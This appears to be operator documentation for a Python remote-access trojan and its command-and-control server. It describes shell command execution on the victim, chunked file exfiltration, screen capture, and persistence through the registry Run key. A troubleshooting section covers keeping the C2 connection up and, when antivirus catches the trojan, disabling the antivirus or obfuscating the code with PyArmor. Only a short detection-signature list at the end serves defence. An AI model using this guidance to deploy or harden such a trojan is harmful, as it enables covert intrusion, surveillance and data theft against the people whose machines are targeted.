HOW THE TROJAN WORKS - DETAILED FLOW
═══════════════════════════════════════════════════════════════════════════════════

1. INITIAL INFECTION (User Execution)
   ─────────────────────────────────

   User runs trojan_client.exe
   ↓
   Python interpreter starts
   ↓
   trojan_client.py loads into memory
   ↓
   SystemInfo class gathers target data
   ↓
   Trojan attempts connection to C2 server


2. CONNECTION ESTABLISHMENT
   ─────────────────────────

   Trojan:                          C2 Server:
   1. Create TCP socket
   2. Connect to C2_SERVER:C2_PORT ──────→ Accept connection
                                     ←──── Send connection ACK
   3. Send system info              ──────→ Receive system info
                                           Log connection
                                           Start ClientHandler thread
   
   System Info sent:
   {
     "hostname": "TESTWIN10",
     "os": "Windows",
     "username": "admin",
     "cpu_count": 4,
     "total_memory": 8589934592
   }


3. COMMAND RECEPTION & EXECUTION
   ──────────────────────────────

   C2 Operator:                     Trojan Client:
   
   Type: shell whoami          →    Receive JSON command
   Send: {"command": "shell",
          "args": "whoami"}    →    Parse JSON
                                    Call CommandExecutor.execute("whoami")
                                    Run: subprocess.run("whoami", shell=True)
                                    Capture output: "DESKTOP-ABC123\admin"
                                    
                               ←    Send output back via socket


4. PERSISTENT CONNECTION LOOP
   ──────────────────────────

   while True:
   ├─ Wait for command from C2
   ├─ Parse command JSON
   ├─ Execute command (shell, file ops, etc)
   ├─ Send result back to C2
   └─ Loop back to wait for next command
   
   If connection drops:
   ├─ Log disconnection
   ├─ Wait RECONNECT_INTERVAL seconds
   ├─ Attempt reconnection to C2
   └─ Resume normal operation if successful


5. FILE TRANSFER MECHANISM
   ───────────────────────

   DOWNLOAD (Target → Attacker):
   
   C2 Command:
   {"command": "download", "args": "C:\\secrets.txt"}
   ↓
   Trojan receives command
   ↓
   Open file: "C:\\secrets.txt"
   ↓
   Send metadata: {"filename": "secrets.txt", "size": 1024}
   ↓
   Read file in CHUNK_SIZE (4096 bytes) chunks:
   - Chunk 1 (4096 bytes) → Send to C2
   - Chunk 2 (4096 bytes) → Send to C2
   - Remaining bytes → Send to C2
   ↓
   C2 receives file metadata
   ↓
   C2 receives file chunks
   ↓
   C2 writes to downloads/secrets.txt


6. SURVEILLANCE (Screenshot)
   ───────────────────────

   C2 Command:
   {"command": "screenshot", "args": ""}
   ↓
   Trojan receives command
   ↓
   ImageGrab.grab() captures screen
   ↓
   Save to temp file: "temp_ss.png"
   ↓
   Send via file transfer mechanism:
   - Send metadata (filename, size)
   - Send PNG data in chunks
   ↓
   Delete temporary file
   ↓
   C2 receives screenshot


7. PERSISTENCE INSTALLATION
   ────────────────────────

   C2 Command:
   {"command": "persist", "args": ""}
   ↓
   Trojan receives command
   ↓
   Windows Registry Mode:
   - Open: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

TROUBLESHOOTING

Issue: Trojan cannot connect to C2 server
─────────────────────────────────────────
Solutions:
1. Verify C2_SERVER IP address is correct
2. Verify C2_PORT matches in both files
3. Check firewall on C2 server: sudo ufw allow 4444
4. Test network connectivity: ping 192.168.1.100 (from target)
5. Verify C2 server is running: python3 c2_server.py
6. Check if port is in use: sudo netstat -tuln | grep 4444

Issue: C2 Server receives connection but then closes
──────────────────────────────────────────────────────
Solutions:
1. Check trojan console output for errors
2. Verify all required Python packages installed on target
3. Check Python version (3.7+): python --version
4. Look for exception in trojan_client.py line 400+

Issue: File transfer fails
──────────────────────────
Solutions:
1. Verify file path exists on target
2. Check file permissions (readable/writable)
3. Check available disk space on target
4. Verify file size < available memory
5. Check network stability (packet loss)

Issue: Screenshot command hangs
───────────────────────────────
Solutions:
1. Verify Pillow is installed: pip install pillow
2. Ensure target has display (not headless)
3. Check display permissions
4. Try again with different user

Issue: Antivirus blocks trojan immediately
───────────────────────────────────────────
Solutions:
1. This is EXPECTED - testing works!
2. Check antivirus logs for detection details
3. Disable antivirus in safe mode if needed
4. Use obfuscation techniques (PyArmor, etc.)
5. Consult antivirus documentation

Network Signatures:

- Detect multiple reconnection attempts from same host
- Alert on file transfers with "filename" and "size" fields

Registry Monitoring:

- Alert on writes to HKEY_CURRENT_USER\...\Run
- Monitor schtasks.exe execution
- Detect modifications to startup folders
- Monitor AppData directory changes

Process Monitoring:

- Alert on python.exe spawning unusual processes
- Monitor for socket operations by Python processes
- Alert on registry.exe modifications
